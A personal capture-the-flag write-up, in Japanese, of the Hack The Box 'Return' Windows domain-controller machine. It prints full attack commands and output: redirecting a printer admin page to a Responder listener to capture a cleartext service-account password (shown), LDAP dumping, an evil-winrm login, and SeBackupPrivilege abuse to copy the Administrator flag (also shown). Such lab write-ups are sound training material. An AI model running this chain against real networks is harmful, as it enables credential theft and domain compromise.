![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/401
- #easy 
- OS : #Windows
- Machine Author(s): [MrR3boot](https://app.hackthebox.com/users/13531)
- Hack Date: 2025-08-13,14:41

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ



## Nmap
- return.local0
- 

| **ポート**   | **サービス**     | **バージョン**                               | **その他**                                               |
| --------- | ------------ | --------------------------------------- | ----------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                         |                                                       |
| 80/tcp    | **HTTP**     | Microsoft IIS httpd 10.0                | http-server-header: Microsoft-IIS/10.0                |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos              | server time: 2025-08-13 05:59:36Z                     |
| 135/tcp   | msrpc        | Microsoft Windows RPC                   |                                                       |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn           |                                                       |
| 389/tcp   | **ldap**     | Microsoft Windows Active Directory LDAP | Domain: return.local0., Site: Default-First-Site-Name |
| 445/tcp   | **SMB**      |                                         |                                                       |
| 464/tcp   | kpasswd5?    |                                         |                                                       |
| 636/tcp   | tcpwrapped   |                                         |                                                       |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP | Domain: return.local0., Site: Default-First-Site-Name |
| 3269/tcp  | tcpwrapped   |                                         |                                                       |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-server-header: Microsoft-HTTPAPI/2.0             |
| 9389/tcp  | mc-nmf       | .NET Message Framing                    |                                                       |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-server-header: Microsoft-HTTPAPI/2.0             |
| 49664/tcp | unknown      |                                         |                                                       |
| 49665/tcp | unknown      |                                         |                                                       |
| 49666/tcp | unknown      |                                         |                                                       |
| 49667/tcp | unknown      |                                         |                                                       |
| 49671/tcp | unknown      |                                         |                                                       |
| 49674/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                       |
| 49675/tcp | unknown      |                                         |                                                       |
| 49678/tcp | unknown      |                                         |                                                       |
| 49681/tcp | unknown      |                                         |                                                       |
| 49694/tcp | unknown      |                                         |                                                       |
| 49722/tcp | unknown      |                                         |                                                       |

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-13 05:59:36Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49671/tcp open  unknown       syn-ack ttl 127
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  unknown       syn-ack ttl 127
49678/tcp open  unknown       syn-ack ttl 127
49681/tcp open  unknown       syn-ack ttl 127
49694/tcp open  unknown       syn-ack ttl 127
49722/tcp open  unknown       syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/12%OT=53%CT=%CU=%PV=Y%G=N%TM=689C2610%P=aarch64-unknown-linux-gnu)
SEQ()
ECN(R=N)
T1(R=N)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36281/tcp): CLEAN (Timeout)
|   Check 2 (port 49639/tcp): CLEAN (Timeout)
|   Check 3 (port 54162/udp): CLEAN (Timeout)
|   Check 4 (port 39883/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 53/tcp)
HOP RTT    ADDRESS
1   ... 30

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.24 seconds
           Raw packets sent: 263 (17.588KB) | Rcvd: 25 (1.100KB)

```

## SMB
- smb匿名ログインできるのか
	- できているけど、匿名ログイン
```bash
└─$ smbclient -N -L //10.129.95.241
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Feroxbuster
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ feroxbuster -u http://10.129.95.241/
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.241/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      151c http://10.129.95.241/images => http://10.129.95.241/images/
301      GET        2l       10w      151c http://10.129.95.241/Images => http://10.129.95.241/Images/
200      GET       39l      196w    17216c http://10.129.95.241/images/1.png
200      GET     1345l     2796w    28274c http://10.129.95.241/index.php
200      GET     1376l     2855w    29090c http://10.129.95.241/settings.php
200      GET     1345l     2796w    28274c http://10.129.95.241/
301      GET        2l       10w      151c http://10.129.95.241/IMAGES => http://10.129.95.241/IMAGES/

<SNIP>
[####################] - 7m    120010/120010  0s      found:82      errors:6992   
[####################] - 7m     30000/30000   70/s    http://10.129.95.241/ 
[####################] - 7m     30000/30000   71/s    http://10.129.95.241/images/ 
[####################] - 7m     30000/30000   71/s    http://10.129.95.241/Images/ 
[####################] - 7m     30000/30000   72/s    http://10.129.95.241/IMAGES/ 
```


## WebSite
- `http://10.129.95.241/`
![](https://i.imgur.com/q9BKjR1.png)

- `http://10.129.95.241/settings.php`
	- ここからusername : svc-printerは露出してるけど、Passwordも実は読めるのでは
		- 読めませんでした
![](https://i.imgur.com/xnqW2Sq.png)

jsが何かをしているわけではなさそう
![](https://i.imgur.com/iPgR0VX.png)

htmlはinputなので、updateボタンがあるので、Passwordを任意に変更できるのではないか
- Passwordを svc-printerに変更して、送信してみる

SMBに、svc-printer : svc-printerでログインしてみる
できなそう
	- webの操作でもPassword変更されないことがわかった

```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ smbclient -L //10.129.193.243 -U svc-printer%svc-printer
session setup failed: NT_STATUS_LOGON_FAILURE

┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ smbclient -L //10.129.193.243 -U svc-printer%*******    
session setup failed: NT_STATUS_LOGON_FAILURE

```

printer.return.localがあることはわかったので、/etc/hostsに追加してみてみる

![](https://i.imgur.com/A9U7Cll.png)


## Responder
このIPを自分のホストのIPに変更して、SSRFとかできないかなと思ったけれども、`nc -lvnp` を建てても、接続されない。
念の為、Responderを立てて、自分のホストを指しして、リクエスト飛ばす。

![](https://i.imgur.com/KbSn5ut.png)

すると、クリアテキストパスワードが取得できる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.62]
    Responder IPv6             [dead:beef:2::103c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-GHCRKE4M265]
    Responder Domain Name      [5JUD.LOCAL]
    Responder DCE-RPC Port     [49686]

[+] Listening for events...                                                      

[LDAP] Cleartext Client   : 10.129.193.243
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

svc-printer の認証情報
svc-printer : 1edFg43012!!
## SMB (再)
- svc-printerの認証情報でログインができるのかどうかを確認する
	- ログインできない
- 単にsvc-printerに、SMBの権限がないかもしれない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ smbclient -L //$Target_IP -U 'svc-printer%1edFg43012!!'
do_connect: Connection to 10.129.193.243 failed (Error NT_STATUS_IO_TIMEOUT)
```


## LDAP
- svc-printerの認証情報でログインができるのかどうかを確認する
	- ログインできる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ ldapsearch -x -H ldap://10.129.193.243 -D 'return\svc-printer' -w '1edFg43012!!' -b 'DC=return,DC=local' '(objectClass=user)'
# extended LDIF
#
# LDAPv3
# base <DC=return,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# Administrator, Users, return.local
dn: CN=Administrator,CN=Users,DC=return,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=return,DC=local
instanceType: 4
whenCreated: 20210520132559.0Z
whenChanged: 20250813063158.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=return,DC=local
memberOf: CN=Domain Admins,CN=Users,DC=return,DC=local
memberOf: CN=Enterprise Admins,CN=Users,DC=return,DC=local
memberOf: CN=Schema Admins,CN=Users,DC=return,DC=local
memberOf: CN=Administrators,CN=Builtin,DC=return,DC=local
uSNChanged: 110636
name: Administrator
objectGUID:: dzfnFtLLe0+Hant15XFaBg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132772132129634234
lastLogoff: 0
lastLogon: 133995403527670041
logonHours:: ////////////////////////////
pwdLastSet: 132709214025576910
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvCJ34NxMq+3qDg09AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 76
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20210520134204.0Z
dSCorePropagationData: 20210520134204.0Z
dSCorePropagationData: 20210520132655.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 133995403183763828

# Guest, Users, return.local
dn: CN=Guest,CN=Users,DC=return,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=return,DC=local
instanceType: 4
whenCreated: 20210520132559.0Z
whenChanged: 20210520132559.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=return,DC=local
uSNChanged: 8197
name: Guest
objectGUID:: MLN5krEJFUOxPMIvXeHKLQ==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAMvCJ34NxMq+3qDg09QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20210520132655.0Z
dSCorePropagationData: 16010101000001.0Z

# PRINTER, Domain Controllers, return.local
dn: CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: PRINTER
distinguishedName: CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
instanceType: 4
whenCreated: 20210520132654.0Z
whenChanged: 20250813063154.0Z
displayName: PRINTER$
uSNCreated: 12293
uSNChanged: 110634
name: PRINTER
objectGUID:: rnXhW2GLrk6iBrD8qKr6Jw==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133995403380014300
localPolicyFlags: 0
pwdLastSet: 133995403019232261
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAAMvCJ34NxMq+3qDg06AMAAA==
accountExpires: 9223372036854775807
logonCount: 75
sAMAccountName: PRINTER$
sAMAccountType: 805306369
operatingSystem: Windows Server 2019 Standard
operatingSystemVersion: 10.0 (17763)
serverReferenceBL: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,C
 N=Configuration,DC=return,DC=local
dNSHostName: printer.return.local
rIDSetReferences: CN=RID Set,CN=PRINTER,OU=Domain Controllers,DC=return,DC=loc
 al
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/printer.return
 .local
servicePrincipalName: ldap/WIN-HQU2BCQL89C/RETURN
servicePrincipalName: HOST/WIN-HQU2BCQL89C/return.local
servicePrincipalName: ldap/WIN-HQU2BCQL89C/ForestDnsZones.return.local
servicePrincipalName: HOST/WIN-HQU2BCQL89C/RETURN
servicePrincipalName: ldap/PRINTER/ForestDnsZones.return.local
servicePrincipalName: ldap/WIN-HQU2BCQL89C/DomainDnsZones.return.local
servicePrincipalName: HOST/PRINTER/return.local
servicePrincipalName: ldap/PRINTER/DomainDnsZones.return.local
servicePrincipalName: GC/PRINTER/return.local
servicePrincipalName: ldap/WIN-HQU2BCQL89C/return.local
servicePrincipalName: GC/WIN-HQU2BCQL89C/return.local
servicePrincipalName: ldap/PRINTER/return.local
servicePrincipalName: RestrictedKrbHost/WIN-HQU2BCQL89C
servicePrincipalName: HOST/WIN-HQU2BCQL89C
servicePrincipalName: ldap/WIN-HQU2BCQL89C
servicePrincipalName: HOST/PRINTER/RETURN
servicePrincipalName: ldap/PRINTER/RETURN
servicePrincipalName: ldap/printer.return.local/ForestDnsZones.return.local
servicePrincipalName: ldap/printer.return.local/DomainDnsZones.return.local
servicePrincipalName: DNS/printer.return.local
servicePrincipalName: GC/printer.return.local/return.local
servicePrincipalName: RestrictedKrbHost/printer.return.local
servicePrincipalName: RestrictedKrbHost/PRINTER
servicePrincipalName: HOST/printer.return.local/RETURN
servicePrincipalName: HOST/PRINTER
servicePrincipalName: HOST/printer.return.local
servicePrincipalName: HOST/printer.return.local/return.local
servicePrincipalName: ldap/printer.return.local/RETURN
servicePrincipalName: ldap/PRINTER
servicePrincipalName: ldap/printer.return.local
servicePrincipalName: ldap/printer.return.local/return.local
servicePrincipalName: RPC/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.l
 ocal
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/c2a9b7bb-a190-4065-
 b4d6-f373b72005f0/return.local
servicePrincipalName: ldap/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.
 local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=return,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20210520132655.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133995403140795042
msDS-AdditionalDnsHostName:: V0lOLUhRVTJCQ1FMODlDACQ=
msDS-AdditionalDnsHostName:: UFJJTlRFUgAk
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: drMfhgobJh0=
msDFSR-ComputerReferenceBL: CN=WIN-HQU2BCQL89C,CN=Topology,CN=Domain System Vo
 lume,CN=DFSR-GlobalSettings,CN=System,DC=return,DC=local

# krbtgt, Users, return.local
dn: CN=krbtgt,CN=Users,DC=return,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=return,DC=local
instanceType: 4
whenCreated: 20210520132654.0Z
whenChanged: 20210520134204.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=return,DC=local
uSNChanged: 12788
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: zyZqau/8ZUi/EdIRXsdUvQ==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132659908148384049
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvCJ34NxMq+3qDg09gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20210520134204.0Z
dSCorePropagationData: 20210520132655.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# SVCPrinter, Users, return.local
dn: CN=SVCPrinter,CN=Users,DC=return,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SVCPrinter
description: Service Account for Printer
givenName: SVCPrinter
distinguishedName: CN=SVCPrinter,CN=Users,DC=return,DC=local
instanceType: 4
whenCreated: 20210526081513.0Z
whenChanged: 20250813063321.0Z
displayName: SVCPrinter
uSNCreated: 20519
memberOf: CN=Server Operators,CN=Builtin,DC=return,DC=local
memberOf: CN=Remote Management Users,CN=Builtin,DC=return,DC=local
memberOf: CN=Print Operators,CN=Builtin,DC=return,DC=local
uSNChanged: 110690
name: SVCPrinter
objectGUID:: /RYh5dNgDEixfon8SeUsmw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133995406319858083
lastLogoff: 0
lastLogon: 133995407843139638
pwdLastSet: 132664905133683619
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvCJ34NxMq+3qDg0TwQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: svc-printer
sAMAccountType: 805306368
userPrincipalName: svc-printer@return.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
dSCorePropagationData: 20210526082603.0Z
dSCorePropagationData: 20210526081513.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133995404019544835

# search reference
ref: ldap://ForestDnsZones.return.local/DC=ForestDnsZones,DC=return,DC=local

# search reference
ref: ldap://DomainDnsZones.return.local/DC=DomainDnsZones,DC=return,DC=local

# search reference
ref: ldap://return.local/CN=Configuration,DC=return,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 5
# numReferences: 3

```

ldapdomaindumpも実行する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ ldapdomaindump ldap://10.129.193.243 -u 'return\svc-printer' -p '1edFg43012!!' 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

```

- `domain_users.html`
![](https://i.imgur.com/lWxcUvc.png)

- `domain_users_by_group.html`
	- svc_printerは、RemoteManagement usersであることがわかる
![](https://i.imgur.com/UCYraMh.png)

# Privilege Escalation

## WinRM
接続する
```sh
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
<SNIP>
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/12/2025  11:32 PM             34 user.txt
```

svc-printerが持っている権限を見る
```sh
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```
- SeLoadDriverPrivilege権限を持ってる
	- [[Windows Privileage Escalation#Print Operators]]
	-  SeLoadDriverPrivilege権限で、 EopLoadDriver.exeによって、システムシェルを取得できるのではないか
		- https://github.com/TarlogicSecurity/EoPLoadDriver
	- ちょっと無理そうかも？(19:14)

## SeBackupPrivilege権限の悪用
-  SeBackupPrivilege権限を悪用できるかもしれない
	- [[Windows Privileage Escalation#役立つツール#Backup Operators]]


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Return]
└─$ evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\root.txt' .\root.txt
*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/18/2025   8:05 AM             34 root.txt
-a----        8/18/2025   7:56 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        8/18/2025   7:56 AM          16384 SeBackupPrivilegeUtils.dll


*Evil-WinRM* PS C:\Users\svc-printer\Documents> type root.txt
3f2f5d6f27ea00f17210f6229541f9ca

```

## Notes
- これは余裕！！(えっへん(何もえらくない))

